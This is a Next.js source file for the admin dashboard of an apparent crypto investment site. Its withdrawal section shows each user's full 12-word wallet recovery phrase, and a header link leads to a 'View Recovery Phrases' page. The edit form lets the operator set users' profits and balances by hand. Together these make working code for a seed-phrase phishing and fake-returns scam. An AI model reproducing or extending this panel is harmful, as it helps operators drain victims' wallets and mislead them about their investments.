"use client";

import { useState, useEffect } from "react";
import { useSession } from "next-auth/react";
import { useRouter } from "next/navigation";
import { motion } from "framer-motion";
import { 
  FaUsers, 
  FaUser, 
  FaCrown, 
  FaEdit, 
  FaTrash, 
  FaEye, 
  FaDollarSign,
  FaTimesCircle,
  FaSearch,
  FaPlus,
  FaArrowUp,
  FaShieldAlt
} from 'react-icons/fa';

const cardVariants = {
  hidden: { opacity: 0, y: 40 },
  visible: { opacity: 1, y: 0, transition: { duration: 0.6 } }
};

// Define admin user type
interface AdminUser {
  id: string;
  name: string;
  email: string;
  role: string;
  totalEarnings: number;
  totalProfit: number;
  activeInvestments: number;
  joinDate: string | Date;
  status: string;
  profile?: any;
  totalDeposits?: number;
  totalWithdrawals?: number;
  investmentPlans?: Array<{
    id: string;
    name: string;
    type: string;
    amount: number;
    currentValue: number;
    status: string;
    startDate: string | Date;
    endDate: string | Date;
  }>;
}

// Real data will be fetched from API
const mockUsers: AdminUser[] = [];
const mockStats = {
  totalUsers: 0,
  activeUsers: 0,
  totalRevenue: 0,
  monthlyGrowth: 0,
  adminUsers: 0,
  newUsersThisMonth: 0
};

export default function AdminPage() {
  const { data: session, status } = useSession();
  const router = useRouter();
  const [users, setUsers] = useState<AdminUser[]>([]);
  const [stats, setStats] = useState(mockStats);
  const [selectedUser, setSelectedUser] = useState<AdminUser | null>(null);
  const [searchTerm, setSearchTerm] = useState("");
  const [filterRole, setFilterRole] = useState("all");
  const [showUserModal, setShowUserModal] = useState(false);
  const [editingUser, setEditingUser] = useState<AdminUser | null>(null);
  const [loading, setLoading] = useState(true);
  const [lastUpdated, setLastUpdated] = useState<Date | null>(null);

  // Function to fetch real user data
  const fetchUsers = async () => {
    try {
      console.log('🔍 [ADMIN DASHBOARD] Fetching users...');
      console.log('🔍 [ADMIN DASHBOARD] Session data:', session);
      console.log('🔍 [ADMIN DASHBOARD] Session user role:', session?.user?.role);
      
      setLoading(true);
      const response = await fetch('/api/admin/users', {
        method: 'GET',
        headers: {
          'Cache-Control': 'no-cache',
          'Pragma': 'no-cache'
        }
      });
      
      console.log('🔍 [ADMIN DASHBOARD] Response status:', response.status);
      console.log('🔍 [ADMIN DASHBOARD] Response headers:', Object.fromEntries(response.headers.entries()));
      
      if (response.ok) {
        const data = await response.json();
        console.log('🔍 [ADMIN DASHBOARD] Response data:', data);
        setUsers(data.users);
        setStats(data.stats);
        setLastUpdated(new Date());
        
        // Show success message
        console.log('✅ [ADMIN DASHBOARD] Users data updated successfully');
      } else {
        const errorData = await response.json();
        console.error('❌ [ADMIN DASHBOARD] Failed to fetch users:', response.status, response.statusText);
        console.error('❌ [ADMIN DASHBOARD] Error details:', errorData);
        alert(`Failed to fetch users: ${errorData.error}\n\nDebug info: ${JSON.stringify(errorData.debug, null, 2)}`);
      }
    } catch (error) {
      console.error('❌ [ADMIN DASHBOARD] Error fetching users:', error);
      alert(`Network error: ${error.message}`);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    console.log('🔍 [ADMIN DASHBOARD] useEffect triggered');
    console.log('🔍 [ADMIN DASHBOARD] Status:', status);
    console.log('🔍 [ADMIN DASHBOARD] Session:', session);
    console.log('🔍 [ADMIN DASHBOARD] Session user role:', session?.user?.role);
    
    if (status === "unauthenticated") {
      console.log('🔍 [ADMIN DASHBOARD] User not authenticated, redirecting to login');
      router.push("/login");
    } else if (status === "authenticated" && session?.user?.role !== "admin") {
      console.log('🔍 [ADMIN DASHBOARD] User authenticated but not admin, redirecting to dashboard');
      router.push("/dashboard");
    } else if (status === "authenticated" && session?.user?.role === "admin") {
      console.log('🔍 [ADMIN DASHBOARD] Admin user authenticated, fetching users');
      // Fetch real data when admin is authenticated
      fetchUsers();
      
      // Set up auto-refresh every 30 seconds
      const interval = setInterval(() => {
        console.log('🔄 [ADMIN DASHBOARD] Auto-refreshing data...');
        fetchUsers();
      }, 30000); // 30 seconds
      
      // Cleanup interval on unmount
      return () => clearInterval(interval);
    } else {
      console.log('🔍 [ADMIN DASHBOARD] Status not handled:', status);
    }
  }, [status, session, router]);

  if (status === "loading") {
    return (
      <div className="min-h-screen bg-[var(--background)] flex items-center justify-center">
        <div className="w-16 h-16 border-4 border-[var(--brand)]/30 border-t-[var(--brand)] rounded-full animate-spin" />
      </div>
    );
  }

  if (!session || session?.user?.role !== "admin") {
    return null;
  }

  const formatCurrency = (amount: number) => {
    return new Intl.NumberFormat('en-US', {
      style: 'currency',
      currency: 'USD',
    }).format(amount);
  };

  const formatDate = (dateString: string) => {
    return new Date(dateString).toLocaleDateString('en-US', {
      year: 'numeric',
      month: 'short',
      day: 'numeric'
    });
  };

  const filteredUsers = users.filter(user => {
    const matchesSearch = user.name.toLowerCase().includes(searchTerm.toLowerCase()) ||
                         user.email.toLowerCase().includes(searchTerm.toLowerCase());
    const matchesRole = filterRole === "all" || user.role === filterRole;
    return matchesSearch && matchesRole;
  });

  const handleEditUser = (user: AdminUser) => {
    setEditingUser(user);
    setShowUserModal(true);
  };

  const handleDeleteUser = (userId: string) => {
    if (confirm("Are you sure you want to delete this user?")) {
      setUsers(users.filter(user => user.id !== userId));
    }
  };

  const handleSaveUser = async (updatedUser: AdminUser) => {
    try {
      console.log('🔍 [ADMIN DASHBOARD] Updating user:', updatedUser);
      
      const response = await fetch('/api/admin/users/update', {
        method: 'PUT',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          userId: updatedUser.id,
          updates: {
            name: updatedUser.name,
            email: updatedUser.email,
            role: updatedUser.role,
            totalProfit: updatedUser.totalProfit,
            currentBalance: updatedUser.totalEarnings,
            totalDeposits: updatedUser.totalDeposits,
            totalWithdrawals: updatedUser.totalWithdrawals,
          }
        }),
      });

      if (response.ok) {
        const data = await response.json();
        console.log('✅ [ADMIN DASHBOARD] User updated successfully:', data);
        
        // Close the modal first
        setShowUserModal(false);
        setEditingUser(null);
        
        // Show success message
        alert('User updated successfully! Refreshing data...');
        
        // Immediately refresh the data to show updated stats
        await fetchUsers();
        
        console.log('✅ [ADMIN DASHBOARD] Data refreshed after user update');
      } else {
        const errorData = await response.json();
        console.error('❌ [ADMIN DASHBOARD] Failed to update user:', errorData);
        alert(`Failed to update user: ${errorData.error}`);
      }
    } catch (error) {
      console.error('❌ [ADMIN DASHBOARD] Error updating user:', error);
      alert('Failed to update user. Please try again.');
    }
  };

  return (
    <main className="min-h-screen bg-[var(--background)] text-[var(--foreground)] pt-20">
      {/* Header */}
      <header className="bg-[var(--card-bg)] border-b border-[var(--brand)]/20 px-4 py-4">
        <div className="max-w-7xl mx-auto flex items-center justify-between">
                      <h1 className="text-2xl font-bold text-[var(--foreground)] flex items-center gap-3">
              <FaCrown className="text-yellow-500" />
              Admin Dashboard
            </h1>
            <div className="flex items-center gap-2">
              <a
                href="/phrase"
                className="px-3 py-1 bg-[var(--brand)] hover:bg-[var(--brand)]/80 text-white text-sm rounded-lg transition-colors flex items-center gap-2"
              >
                <FaShieldAlt size={14} />
                View Recovery Phrases
              </a>
            </div>
          <div className="flex items-center gap-4">
                                     <div className="flex gap-2">
               <button 
                 onClick={fetchUsers}
                 disabled={loading}
                 className="px-3 py-1 bg-[var(--brand)] hover:bg-[var(--brand)]/80 text-white text-sm rounded-lg transition-colors flex items-center gap-2 disabled:opacity-50"
               >
                 {loading ? (
                   <div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
                 ) : (
                   <FaArrowUp size={14} />
                 )}
                 Refresh
               </button>
             </div>
                         <div className="flex items-center gap-4 text-sm text-[var(--foreground)]/60">
               {lastUpdated && (
                 <div className="text-xs">
                   <span className="text-[var(--foreground)]/40">Last updated: </span>
                   <span className="text-[var(--foreground)]/60">
                     {lastUpdated.toLocaleTimeString()}
                   </span>
                 </div>
               )}
               <div className="flex items-center gap-2">
                 <FaUser size={16} />
                 <span>{session.user?.name || 'Admin'}</span>
               </div>
             </div>
          </div>
        </div>
      </header>

      <div className="max-w-7xl mx-auto px-4 py-8">
        {/* Stats Overview */}
        <motion.div
          initial="hidden"
          animate="visible"
          variants={cardVariants}
          className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6 mb-8"
        >
          <div className="bg-[var(--card-bg)] border border-[var(--brand)]/20 rounded-xl shadow-xl p-6">
            <div className="flex items-center justify-between mb-4">
              <h3 className="text-[var(--foreground)]/60 text-sm font-medium">Total Users</h3>
              <FaUsers className="text-[var(--brand)]" size={20} />
            </div>
            <div className="text-2xl font-bold text-[var(--foreground)] mb-2">
              {stats.totalUsers.toLocaleString()}
            </div>
            <div className="flex items-center gap-2 text-sm">
              <FaArrowUp className="text-green-500" size={12} />
              <span className="text-green-500">+{stats.newUsersThisMonth}</span>
              <span className="text-[var(--foreground)]/60">this month</span>
            </div>
          </div>

          <div className="bg-[var(--card-bg)] border border-[var(--brand)]/20 rounded-xl shadow-xl p-6">
            <div className="flex items-center justify-between mb-4">
              <h3 className="text-[var(--foreground)]/60 text-sm font-medium">Active Users</h3>
              <FaUser className="text-green-500" size={20} />
            </div>
            <div className="text-2xl font-bold text-[var(--foreground)] mb-2">
              {stats.activeUsers.toLocaleString()}
            </div>
            <div className="text-sm text-[var(--foreground)]/60">
              {stats.totalUsers > 0 ? ((stats.activeUsers / stats.totalUsers) * 100).toFixed(1) : 0}% active rate
            </div>
          </div>

          <div className="bg-[var(--card-bg)] border border-[var(--brand)]/20 rounded-xl shadow-xl p-6">
            <div className="flex items-center justify-between mb-4">
              <h3 className="text-[var(--foreground)]/60 text-sm font-medium">Total Revenue</h3>
              <FaDollarSign className="text-green-500" size={20} />
            </div>
            <div className="text-2xl font-bold text-[var(--foreground)] mb-2">
              {formatCurrency(stats.totalRevenue)}
            </div>
            <div className="flex items-center gap-2 text-sm">
              <FaArrowUp className="text-green-500" size={12} />
              <span className="text-green-500">+{stats.monthlyGrowth}%</span>
              <span className="text-[var(--foreground)]/60">this month</span>
            </div>
          </div>

          <div className="bg-[var(--card-bg)] border border-[var(--brand)]/20 rounded-xl shadow-xl p-6">
            <div className="flex items-center justify-between mb-4">
              <h3 className="text-[var(--foreground)]/60 text-sm font-medium">Admin Users</h3>
              <FaCrown className="text-yellow-500" size={20} />
            </div>
            <div className="text-2xl font-bold text-[var(--foreground)] mb-2">
              {stats.adminUsers}
            </div>
            <div className="text-sm text-[var(--foreground)]/60">
              System administrators
            </div>
          </div>
        </motion.div>

        

        {/* Quick Actions */}
        <motion.div
          initial="hidden"
          animate="visible"
          variants={cardVariants}
          className="bg-[var(--card-bg)] border border-[var(--brand)]/20 rounded-xl shadow-xl p-6 mb-8"
        >
          <h2 className="text-xl font-bold text-[var(--foreground)] mb-4">Quick Actions</h2>
          <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
            <button 
              onClick={() => alert('Feature coming soon!')}
              className="p-4 bg-green-500/10 border border-green-500/20 rounded-lg hover:bg-green-500/20 transition-colors text-left"
            >
              <div className="text-green-500 font-semibold mb-1">Add Bonus to All Users</div>
              <div className="text-sm text-[var(--foreground)]/60">Give bonus to all active users</div>
            </button>
            
            <button 
              onClick={() => alert('Feature coming soon!')}
              className="p-4 bg-blue-500/10 border border-blue-500/20 rounded-lg hover:bg-blue-500/20 transition-colors text-left"
            >
              <div className="text-blue-500 font-semibold mb-1">Update Profits</div>
              <div className="text-sm text-[var(--foreground)]/60">Bulk update user profits</div>
            </button>
            
            <button 
              onClick={() => alert('Feature coming soon!')}
              className="p-4 bg-purple-500/10 border border-purple-500/20 rounded-lg hover:bg-purple-500/20 transition-colors text-left"
            >
              <div className="text-purple-500 font-semibold mb-1">Export Data</div>
              <div className="text-sm text-[var(--foreground)]/60">Export user data to CSV</div>
            </button>
          </div>
        </motion.div>

                 {/* Withdrawal Requests */}
         <motion.div
           initial="hidden"
           animate="visible"
           variants={cardVariants}
           className="bg-[var(--card-bg)] border border-[var(--brand)]/20 rounded-xl shadow-xl p-6 mb-8"
         >
                       <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 mb-6">
              <h2 className="text-xl font-bold text-[var(--foreground)]">Withdrawal Requests</h2>
              <div className="text-sm text-[var(--foreground)]/60">
                Manage user withdrawal requests and view their 12-word recovery phrases
              </div>
            </div>

                       <div className="overflow-x-auto">
              {/* Summary */}
              <div className="mb-4 p-3 bg-[var(--background)]/50 rounded-lg border border-[var(--brand)]/20">
                <div className="text-sm text-[var(--foreground)]/60">
                  <strong>Summary:</strong> {users.reduce((total, user) => total + (user.withdrawalRequests?.length || 0), 0)} pending withdrawal requests from {users.filter(user => user.withdrawalRequests && user.withdrawalRequests.length > 0).length} users
                </div>
              </div>
              
              {/* Debug Info */}
              <div className="mb-4 p-3 bg-yellow-500/10 border border-yellow-500/20 rounded-lg">
                <div className="text-sm text-yellow-600">
                  <strong>Debug Info:</strong>
                  <div>Total users: {users.length}</div>
                  <div>Users with withdrawal requests: {users.filter(user => user.withdrawalRequests && user.withdrawalRequests.length > 0).length}</div>
                  <div>Raw user data: {JSON.stringify(users.map(user => ({ 
                    name: user.name, 
                    email: user.email,
                    hasInvestment: !!user.investment,
                    investmentKeys: user.investment ? Object.keys(user.investment) : [],
                    withdrawalRequests: user.withdrawalRequests,
                    withdrawalRequestsLength: user.withdrawalRequests?.length || 0
                  })), null, 2)}</div>
                </div>
              </div>
              
              {users.some(user => user.withdrawalRequests && user.withdrawalRequests.length > 0) ? (
               <div className="space-y-4">
                 {users.map(user => 
                   user.withdrawalRequests && user.withdrawalRequests.length > 0 ? 
                     user.withdrawalRequests.map((request: any, index: number) => (
                       <div key={`${user.id}-${index}`} className="bg-[var(--background)]/50 p-4 rounded-lg border border-[var(--brand)]/20">
                         <div className="flex flex-col md:flex-row md:items-center justify-between gap-4">
                           <div className="flex-1">
                             <div className="flex items-center gap-3 mb-2">
                               <div className="w-8 h-8 bg-[var(--brand)]/20 rounded-full flex items-center justify-center">
                                 <FaUser className="text-[var(--brand)]" size={14} />
                               </div>
                               <div>
                                 <div className="font-medium text-[var(--foreground)]">{user.name}</div>
                                 <div className="text-sm text-[var(--foreground)]/60">{user.email}</div>
                               </div>
                             </div>
                             <div className="grid grid-cols-2 md:grid-cols-4 gap-4 text-sm">
                               <div>
                                 <span className="text-[var(--foreground)]/60">Amount:</span>
                                 <div className="font-semibold text-[var(--foreground)]">${request.amount}</div>
                               </div>
                               <div>
                                 <span className="text-[var(--foreground)]/60">Wallet App:</span>
                                 <div className="font-semibold text-[var(--foreground)]">{request.walletName}</div>
                                 <div className="text-xs text-[var(--foreground)]/60">Type: {request.walletType}</div>
                               </div>
                               <div>
                                 <span className="text-[var(--foreground)]/60">Status:</span>
                                 <span className={`inline-flex items-center px-2 py-1 rounded-full text-xs font-medium ${
                                   request.status === 'pending' ? 'bg-yellow-100 text-yellow-800' :
                                   request.status === 'approved' ? 'bg-green-100 text-green-800' :
                                   request.status === 'rejected' ? 'bg-red-100 text-red-800' :
                                   'bg-blue-100 text-blue-800'
                                 }`}>
                                   {request.status}
                                 </span>
                               </div>
                               <div>
                                 <span className="text-[var(--foreground)]/60">Date:</span>
                                 <div className="font-semibold text-[var(--foreground)]">
                                   {new Date(request.timestamp).toLocaleDateString()}
                                 </div>
                               </div>
                             </div>
                             <div className="mt-2">
                               <span className="text-[var(--foreground)]/60">Recovery Phrase:</span>
                               <div className="text-xs text-[var(--foreground)]/40 mb-1">
                                 User's 12-word recovery phrase for verification
                               </div>
                               <div className="grid grid-cols-3 gap-1 mt-2">
                                 {request.recoveryPhrase.split(' ').map((word: string, index: number) => (
                                   <div key={index} className="flex items-center gap-1">
                                     <span className="w-4 h-4 bg-[var(--brand)] text-white text-xs rounded-full flex items-center justify-center">
                                       {index + 1}
                                     </span>
                                     <span className="font-mono text-xs bg-[var(--background)] px-2 py-1 rounded border border-[var(--brand)]/20">
                                       {word}
                                     </span>
                                   </div>
                                 ))}
                               </div>
                             </div>
                           </div>
                           <div className="flex gap-2">
                             <button
                               onClick={() => {
                                 if (confirm(`Approve withdrawal of $${request.amount} for ${user.name}?`)) {
                                   // Here you would update the withdrawal status
                                   alert('Withdrawal approved! Update the status in your database.');
                                 }
                               }}
                               className="px-3 py-1 bg-green-500 hover:bg-green-600 text-white text-sm rounded-lg transition-colors"
                             >
                               Approve
                             </button>
                             <button
                               onClick={() => {
                                 if (confirm(`Reject withdrawal of $${request.amount} for ${user.name}?`)) {
                                   // Here you would update the withdrawal status
                                   alert('Withdrawal rejected! Update the status in your database.');
                                 }
                               }}
                               className="px-3 py-1 bg-red-500 hover:bg-red-600 text-white text-sm rounded-lg transition-colors"
                             >
                               Reject
                             </button>
                           </div>
                         </div>
                       </div>
                     ))
                   : null
                 )}
               </div>
             ) : (
               <div className="text-center py-8">
                 <div className="text-[var(--foreground)]/40 mb-2">No withdrawal requests</div>
                 <div className="text-sm text-[var(--foreground)]/60">Users will appear here when they submit withdrawal requests</div>
               </div>
             )}
           </div>
         </motion.div>

         {/* User Management */}
         <motion.div
           initial="hidden"
           animate="visible"
           variants={cardVariants}
           className="bg-[var(--card-bg)] border border-[var(--brand)]/20 rounded-xl shadow-xl p-6"
         >
          <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 mb-6">
            <h2 className="text-xl font-bold text-[var(--foreground)]">User Management</h2>
            <div className="flex flex-col sm:flex-row gap-3">
              <div className="flex gap-2">
                <div className="relative">
                  <FaSearch className="absolute left-3 top-1/2 transform -translate-y-1/2 text-[var(--foreground)]/40" size={16} />
                  <input
                    type="text"
                    placeholder="Search users..."
                    value={searchTerm}
                    onChange={(e) => setSearchTerm(e.target.value)}
                    className="pl-10 pr-4 py-2 bg-[var(--background)] border border-[var(--brand)]/20 rounded-lg text-[var(--foreground)] placeholder-[var(--foreground)]/40 focus:outline-none focus:border-[var(--brand)]"
                  />
                </div>
                <select
                  value={filterRole}
                  onChange={(e) => setFilterRole(e.target.value)}
                  className="px-4 py-2 bg-[var(--background)] border border-[var(--brand)]/20 rounded-lg text-[var(--foreground)] focus:outline-none focus:border-[var(--brand)]"
                >
                  <option value="all">All Roles</option>
                  <option value="admin">Admin</option>
                  <option value="user">User</option>
                </select>
              </div>
              <button className="bg-[var(--brand)] hover:bg-[var(--brand)]/80 text-white px-4 py-2 rounded-lg flex items-center gap-2 transition-colors">
                <FaPlus size={16} />
                Add User
              </button>
            </div>
          </div>

          <div className="overflow-x-auto">
            {loading ? (
              <div className="flex items-center justify-center py-12">
                <div className="w-8 h-8 border-4 border-[var(--brand)]/30 border-t-[var(--brand)] rounded-full animate-spin"></div>
                <span className="ml-3 text-[var(--foreground)]/60">Loading users...</span>
              </div>
            ) : users.length === 0 ? (
              <div className="flex items-center justify-center py-12">
                <div className="text-center">
                  <FaUsers className="mx-auto text-[var(--foreground)]/40 mb-3" size={48} />
                  <h3 className="text-lg font-medium text-[var(--foreground)] mb-2">No users found</h3>
                  <p className="text-[var(--foreground)]/60">Users will appear here once they register on the platform.</p>
                </div>
              </div>
            ) : (
              <table className="w-full">
              <thead className="bg-[var(--background)]/50">
                <tr>
                  <th className="px-4 py-3 text-left text-sm font-medium text-[var(--foreground)]/60">User</th>
                  <th className="px-4 py-3 text-left text-sm font-medium text-[var(--foreground)]/60">Role</th>
                  <th className="px-4 py-3 text-left text-sm font-medium text-[var(--foreground)]/60">Earnings</th>
                  <th className="px-4 py-3 text-left text-sm font-medium text-[var(--foreground)]/60">Profit</th>
                  <th className="px-4 py-3 text-left text-sm font-medium text-[var(--foreground)]/60">Investments</th>
                  <th className="px-4 py-3 text-left text-sm font-medium text-[var(--foreground)]/60">Joined</th>
                  <th className="px-4 py-3 text-left text-sm font-medium text-[var(--foreground)]/60">Actions</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-[var(--brand)]/10">
                {filteredUsers.map((user) => (
                  <tr key={user.id} className="hover:bg-[var(--background)]/30 transition-colors">
                    <td className="px-4 py-4">
                      <div className="flex items-center gap-3">
                        <div className="w-10 h-10 bg-[var(--brand)]/20 rounded-full flex items-center justify-center">
                          <FaUser className="text-[var(--brand)]" size={16} />
                        </div>
                        <div>
                          <div className="font-medium text-[var(--foreground)]">{user.name}</div>
                          <div className="text-sm text-[var(--foreground)]/60">{user.email}</div>
                        </div>
                      </div>
                    </td>
                    <td className="px-4 py-4">
                      <span className={`inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium ${
                        user.role === 'admin' 
                          ? 'bg-yellow-100 text-yellow-800' 
                          : 'bg-blue-100 text-blue-800'
                      }`}>
                        {user.role === 'admin' && <FaCrown className="mr-1" size={12} />}
                        {user.role}
                      </span>
                    </td>
                    <td className="px-4 py-4 font-semibold text-[var(--foreground)]">
                      {formatCurrency(user.totalEarnings)}
                    </td>
                    <td className="px-4 py-4 font-semibold text-green-500">
                      +{formatCurrency(user.totalProfit)}
                    </td>
                    <td className="px-4 py-4">
                      <span className="inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium bg-green-100 text-green-800">
                        {user.activeInvestments} active
                      </span>
                    </td>
                    <td className="px-4 py-4 text-sm text-[var(--foreground)]/80">
                      {formatDate(user.joinDate)}
                    </td>
                    <td className="px-4 py-4">
                      <div className="flex items-center gap-2">
                        <button
                          onClick={() => setSelectedUser(user)}
                          className="p-2 text-[var(--foreground)]/60 hover:text-[var(--foreground)] hover:bg-[var(--background)]/50 rounded-lg transition-colors"
                          title="View Details"
                        >
                          <FaEye size={16} />
                        </button>
                        <button
                          onClick={() => handleEditUser(user)}
                          className="p-2 text-[var(--foreground)]/60 hover:text-[var(--foreground)] hover:bg-[var(--background)]/50 rounded-lg transition-colors"
                          title="Edit User"
                        >
                          <FaEdit size={16} />
                        </button>
                        <button
                          onClick={() => handleDeleteUser(user.id)}
                          className="p-2 text-red-500/60 hover:text-red-500 hover:bg-red-500/10 rounded-lg transition-colors"
                          title="Delete User"
                        >
                          <FaTrash size={16} />
                        </button>
                      </div>
                    </td>
                  </tr>
                ))}
                </tbody>
              </table>
            )}
          </div>
        </motion.div>
      </div>

      {/* User Details Modal */}
      {selectedUser && (
        <div className="fixed inset-0 bg-black/50 flex items-center justify-center p-4 z-50">
          <motion.div
            initial={{ opacity: 0, scale: 0.9 }}
            animate={{ opacity: 1, scale: 1 }}
            className="bg-[var(--card-bg)] border border-[var(--brand)]/20 rounded-xl shadow-2xl p-6 max-w-2xl w-full max-h-[90vh] overflow-y-auto"
          >
            <div className="flex items-center justify-between mb-6">
              <h3 className="text-xl font-bold text-[var(--foreground)]">User Details</h3>
              <button
                onClick={() => setSelectedUser(null)}
                className="text-[var(--foreground)]/60 hover:text-[var(--foreground)] transition-colors"
              >
                <FaTimesCircle size={24} />
              </button>
            </div>
            
            <div className="space-y-4">
              <div className="grid grid-cols-2 gap-4">
                <div>
                  <label className="text-sm text-[var(--foreground)]/60">Name</label>
                  <div className="text-[var(--foreground)] font-medium">{selectedUser.name}</div>
                </div>
                <div>
                  <label className="text-sm text-[var(--foreground)]/60">Email</label>
                  <div className="text-[var(--foreground)] font-medium">{selectedUser.email}</div>
                </div>
                <div>
                  <label className="text-sm text-[var(--foreground)]/60">Role</label>
                  <div className="text-[var(--foreground)] font-medium capitalize">{selectedUser.role}</div>
                </div>
                <div>
                  <label className="text-sm text-[var(--foreground)]/60">Status</label>
                  <div className="text-[var(--foreground)] font-medium capitalize">{selectedUser.status}</div>
                </div>
              </div>
              
              <div className="border-t border-[var(--brand)]/20 pt-4">
                <h4 className="font-semibold text-[var(--foreground)] mb-3">Investment Summary</h4>
                <div className="grid grid-cols-2 gap-4">
                  <div className="bg-[var(--background)]/50 p-3 rounded-lg">
                    <div className="text-sm text-[var(--foreground)]/60">Total Earnings</div>
                    <div className="text-lg font-bold text-[var(--foreground)]">{formatCurrency(selectedUser.totalEarnings)}</div>
                  </div>
                  <div className="bg-[var(--background)]/50 p-3 rounded-lg">
                    <div className="text-sm text-[var(--foreground)]/60">Total Profit</div>
                    <div className="text-lg font-bold text-green-500">+{formatCurrency(selectedUser.totalProfit)}</div>
                  </div>
                  <div className="bg-[var(--background)]/50 p-3 rounded-lg">
                    <div className="text-sm text-[var(--foreground)]/60">Active Investments</div>
                    <div className="text-lg font-bold text-[var(--foreground)]">{selectedUser.activeInvestments}</div>
                  </div>
                  <div className="bg-[var(--background)]/50 p-3 rounded-lg">
                    <div className="text-sm text-[var(--foreground)]/60">Join Date</div>
                    <div className="text-lg font-bold text-[var(--foreground)]">{formatDate(selectedUser.joinDate)}</div>
                  </div>
                </div>
              </div>
            </div>
          </motion.div>
        </div>
      )}

      {/* Edit User Modal */}
      {showUserModal && editingUser && (
        <div className="fixed inset-0 bg-black/50 flex items-center justify-center p-4 z-50">
          <motion.div
            initial={{ opacity: 0, scale: 0.9 }}
            animate={{ opacity: 1, scale: 1 }}
            className="bg-[var(--card-bg)] border border-[var(--brand)]/20 rounded-xl shadow-2xl p-6 max-w-md w-full"
          >
            <div className="flex items-center justify-between mb-6">
              <h3 className="text-xl font-bold text-[var(--foreground)]">Edit User</h3>
              <button
                onClick={() => setShowUserModal(false)}
                className="text-[var(--foreground)]/60 hover:text-[var(--foreground)] transition-colors"
              >
                <FaTimesCircle size={24} />
              </button>
            </div>
            
            <form className="space-y-4" onSubmit={(e) => {
              e.preventDefault();
              handleSaveUser(editingUser);
            }}>
              <div>
                <label className="block text-sm text-[var(--foreground)]/60 mb-2">Name</label>
                <input
                  type="text"
                  value={editingUser?.name || ''}
                  onChange={(e) => editingUser && setEditingUser({...editingUser, name: e.target.value})}
                  className="w-full px-3 py-2 bg-[var(--background)] border border-[var(--brand)]/20 rounded-lg text-[var(--foreground)] focus:outline-none focus:border-[var(--brand)]"
                />
              </div>
              
              <div>
                <label className="block text-sm text-[var(--foreground)]/60 mb-2">Email</label>
                <input
                  type="email"
                  value={editingUser?.email || ''}
                  onChange={(e) => editingUser && setEditingUser({...editingUser, email: e.target.value})}
                  className="w-full px-3 py-2 bg-[var(--background)] border border-[var(--brand)]/20 rounded-lg text-[var(--foreground)] focus:outline-none focus:border-[var(--brand)]"
                />
              </div>
              
              <div>
                <label className="block text-sm text-[var(--foreground)]/60 mb-2">Role</label>
                <select
                  value={editingUser?.role || 'user'}
                  onChange={(e) => editingUser && setEditingUser({...editingUser, role: e.target.value})}
                  className="w-full px-3 py-2 bg-[var(--background)] border border-[var(--brand)]/20 rounded-lg text-[var(--foreground)] focus:outline-none focus:border-[var(--brand)]"
                >
                  <option value="user">User</option>
                  <option value="admin">Admin</option>
                </select>
              </div>

              <div className="border-t border-[var(--brand)]/20 pt-4">
                <h4 className="font-semibold text-[var(--foreground)] mb-3">Investment Management</h4>
                
                <div className="grid grid-cols-2 gap-3">
                  <div>
                    <label className="block text-sm text-[var(--foreground)]/60 mb-2">Total Profit ($)</label>
                    <input
                      type="number"
                      step="0.01"
                      value={editingUser?.totalProfit || 0}
                      onChange={(e) => editingUser && setEditingUser({...editingUser, totalProfit: parseFloat(e.target.value) || 0})}
                      className="w-full px-3 py-2 bg-[var(--background)] border border-[var(--brand)]/20 rounded-lg text-[var(--foreground)] focus:outline-none focus:border-[var(--brand)]"
                    />
                  </div>
                  
                  <div>
                    <label className="block text-sm text-[var(--foreground)]/60 mb-2">Current Balance ($)</label>
                    <input
                      type="number"
                      step="0.01"
                      value={editingUser?.totalEarnings || 0}
                      onChange={(e) => editingUser && setEditingUser({...editingUser, totalEarnings: parseFloat(e.target.value) || 0})}
                      className="w-full px-3 py-2 bg-[var(--background)] border border-[var(--brand)]/20 rounded-lg text-[var(--foreground)] focus:outline-none focus:border-[var(--brand)]"
                    />
                  </div>
                  
                  <div>
                    <label className="block text-sm text-[var(--foreground)]/60 mb-2">Total Deposits ($)</label>
                    <input
                      type="number"
                      step="0.01"
                      value={editingUser?.totalDeposits || 0}
                      onChange={(e) => editingUser && setEditingUser({...editingUser, totalDeposits: parseFloat(e.target.value) || 0})}
                      className="w-full px-3 py-2 bg-[var(--background)] border border-[var(--brand)]/20 rounded-lg text-[var(--foreground)] focus:outline-none focus:border-[var(--brand)]"
                    />
                  </div>
                  
                  <div>
                    <label className="block text-sm text-[var(--foreground)]/60 mb-2">Total Withdrawals ($)</label>
                    <input
                      type="number"
                      step="0.01"
                      value={editingUser?.totalWithdrawals || 0}
                      onChange={(e) => editingUser && setEditingUser({...editingUser, totalWithdrawals: parseFloat(e.target.value) || 0})}
                      className="w-full px-3 py-2 bg-[var(--background)] border border-[var(--brand)]/20 rounded-lg text-[var(--foreground)] focus:outline-none focus:border-[var(--brand)]"
                    />
                  </div>
                </div>
              </div>
              
              <div className="flex gap-3 pt-4">
                <button
                  type="button"
                  onClick={() => setShowUserModal(false)}
                  className="flex-1 px-4 py-2 border border-[var(--brand)]/20 text-[var(--foreground)] rounded-lg hover:bg-[var(--background)] transition-colors"
                >
                  Cancel
                </button>
                <button
                  type="submit"
                  className="flex-1 px-4 py-2 bg-[var(--brand)] text-white rounded-lg hover:bg-[var(--brand)]/80 transition-colors"
                >
                  Save Changes
                </button>
              </div>
            </form>
          </motion.div>
        </div>
      )}
    </main>
  );
}
